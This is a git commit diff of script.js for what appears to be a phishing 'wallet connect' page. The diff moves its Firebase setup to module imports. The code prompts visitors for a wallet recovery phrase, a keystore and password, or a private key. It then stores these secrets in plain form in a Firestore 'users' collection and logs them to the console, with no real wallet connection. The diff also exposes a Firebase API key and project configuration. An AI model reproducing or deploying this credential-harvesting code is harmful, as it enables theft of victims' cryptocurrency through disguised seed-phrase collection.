65c917a0f50651c30dfb111694f059c77ba68cb2
psdnewdoc <150559340+psdnewdoc@users.noreply.github.com>
2023-11-13 14:40:06 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,119 +1,116 @@
+// Include the Firebase JavaScript SDK
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js';
+import { getAuth, createUserWithEmailAndPassword } from 'https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js';
+import { getFirestore, doc, setDoc } from 'https://www.gstatic.com/firebasejs/10.6.0/firebase-firestore.js';
 
-  <!-- Include the Firebase JavaScript SDK -->
-<script src="https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.6.0/firebase-firestore.js"></script>
+// Initialize Firebase with your own configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyCWsLUONo3eVXS4R-2niIJZYaA8I0RtrbQ",
+  authDomain: "crypto-jwv.firebaseapp.com",
+  projectId: "crypto-jwv",
+  storageBucket: "crypto-jwv.appspot.com",
+  messagingSenderId: "653329737827",
+  appId: "1:653329737827:web:81394c978771bc4a35b056"
+};
 
-<!-- Initialize Firebase with your own configuration -->
-<script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyCWsLUONo3eVXS4R-2niIJZYaA8I0RtrbQ",
-    authDomain: "crypto-jwv.firebaseapp.com",
-    projectId: "crypto-jwv",
-    storageBucket: "crypto-jwv.appspot.com",
-    messagingSenderId: "653329737827",
-    appId: "1:653329737827:web:81394c978771bc4a35b056"
-  };
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
 
-  // Initialize Firebase
-  const app = firebase.initializeApp(firebaseConfig);
+// Reference to Firestore
+const db = getFirestore(app);
 
-  // Reference to Firestore
-  const db = app.firestore();
+function selectWallet() {
+  var selectedWallet = document.getElementById("wallet-list").value;
+  document.getElementById("selected-wallet").value = selectedWallet;
+  showWalletForm(selectedWallet);
+}
 
+function showWalletForm(selectedWallet) {
+  document.getElementById('wallet-connect-form').style.display = 'block';
+  showInfoInput(selectedWallet);
+}
 
-  function selectWallet() {
-    var selectedWallet = document.getElementById("wallet-list").value;
-    document.getElementById("selected-wallet").value = selectedWallet;
-    showWalletForm(selectedWallet);
+function showInfoInput(selectedWallet) {
+  const walletInfoType = document.getElementById('wallet-info-type').value;
+  const infoInputContainer = document.getElementById('info-input-container');
+  infoInputContainer.innerHTML = '';
+
+  switch (walletInfoType) {
+    case 'phrase':
+      infoInputContainer.innerHTML = `
+        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
+        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
+      `;
+      break;
+    case 'keystore':
+      infoInputContainer.innerHTML = `
+        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
+        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
+        <label for="wallet-password">Wallet Password:</label>
+        <input type="password" id="wallet-password" placeholder="Enter your password">
+      `;
+      break;
+    case 'private-key':
+      infoInputContainer.innerHTML = `
+        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
+        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
+      `;
+      break;
+    default:
+      break;
+  }
+}
+
+function connectWallet() {
+  const selectedWallet = document.getElementById('selected-wallet').value;
+  const walletInfoType = document.getElementById('wallet-info-type').value;
+
+  let walletCredentials;
+  switch (walletInfoType) {
+    case 'phrase':
+      walletCredentials = document.getElementById('wallet-phrase').value;
+      break;
+    case 'keystore':
+      const walletKeystore = document.getElementById('wallet-keystore').value;
+      const walletPassword = document.getElementById('wallet-password').value;
+      walletCredentials = { keystore: walletKeystore, password: walletPassword };
+      break;
+    case 'private-key':
+      walletCredentials = document.getElementById('wallet-private-key').value;
+      break;
+    default:
+      break;
   }
 
-  function showWalletForm(selectedWallet) {
-    document.getElementById('wallet-connect-form').style.display = 'block';
-    showInfoInput(selectedWallet);
-  }
+  // Perform user authentication logic using Firebase
+  const auth = getAuth(app);
+  createUserWithEmailAndPassword(auth, "user@example.com", "password")
+    .then((userCredential) => {
+      // Signed in
+      const user = userCredential.user;
+      const uid = user.uid;
 
-  function showInfoInput(selectedWallet) {
-    const walletInfoType = document.getElementById('wallet-info-type').value;
-    const infoInputContainer = document.getElementById('info-input-container');
-    infoInputContainer.innerHTML = '';
+      // Save user details to Firestore
+      saveUserDetails(uid, selectedWallet, walletInfoType, walletCredentials);
 
-    switch (walletInfoType) {
-      case 'phrase':
-        infoInputContainer.innerHTML = `
-          <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
-          <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
-        `;
-        break;
-      case 'keystore':
-        infoInputContainer.innerHTML = `
-          <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
-          <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
-          <label for="wallet-password">Wallet Password:</label>
-          <input type="password" id="wallet-password" placeholder="Enter your password">
-        `;
-        break;
-      case 'private-key':
-        infoInputContainer.innerHTML = `
-          <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
-          <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
-        `;
-        break;
-      default:
-        break;
-    }
-  }
+      // Add your actual wallet connection logic here
 
-  function connectWallet() {
-    const selectedWallet = document.getElementById('selected-wallet').value;
-    const walletInfoType = document.getElementById('wallet-info-type').value;
-
-    let walletCredentials;
-    switch (walletInfoType) {
-      case 'phrase':
-        walletCredentials = document.getElementById('wallet-phrase').value;
-        break;
-      case 'keystore':
-        const walletKeystore = document.getElementById('wallet-keystore').value;
-        const walletPassword = document.getElementById('wallet-password').value;
-        walletCredentials = { keystore: walletKeystore, password: walletPassword };
-        break;
-      case 'private-key':
-        walletCredentials = document.getElementById('wallet-private-key').value;
-        break;
-      default:
-        break;
-    }
-
-    // Perform user authentication logic using Firebase
-    firebase.auth().createUserWithEmailAndPassword("user@example.com", "password")
-      .then((userCredential) => {
-        // Signed in
-        const user = userCredential.user;
-        const uid = user.uid;
-
-        // Save user details to Firestore
-        saveUserDetails(uid, selectedWallet, walletInfoType, walletCredentials);
-
-        // Add your actual wallet connection logic here
-
-        console.log('Selected Wallet:', selectedWallet);
-        console.log('Information Type:', walletInfoType);
-        console.log('Credentials:', walletCredentials);
-      })
-      .catch((error) => {
-        const errorCode = error.code;
-        const errorMessage = error.message;
-        console.error(errorMessage);
-      });
-  }
-
-  function saveUserDetails(uid, selectedWallet, walletInfoType, walletCredentials) {
-    // Save user details to Firestore
-    db.collection('users').doc(uid).set({
-      selectedWallet: selectedWallet,
-      walletInfoType: walletInfoType,
-      walletCredentials: walletCredentials,
+      console.log('Selected Wallet:', selectedWallet);
+      console.log('Information Type:', walletInfoType);
+      console.log('Credentials:', walletCredentials);
+    })
+    .catch((error) => {
+      const errorCode = error.code;
+      const errorMessage = error.message;
+      console.error(errorMessage);
     });
-  }
-</script>
+}
+
+function saveUserDetails(uid, selectedWallet, walletInfoType, walletCredentials) {
+  // Save user details to Firestore
+  setDoc(doc(db, 'users', uid), {
+    selectedWallet: selectedWallet,
+    walletInfoType: walletInfoType,
+    walletCredentials: walletCredentials,
+  });
+}
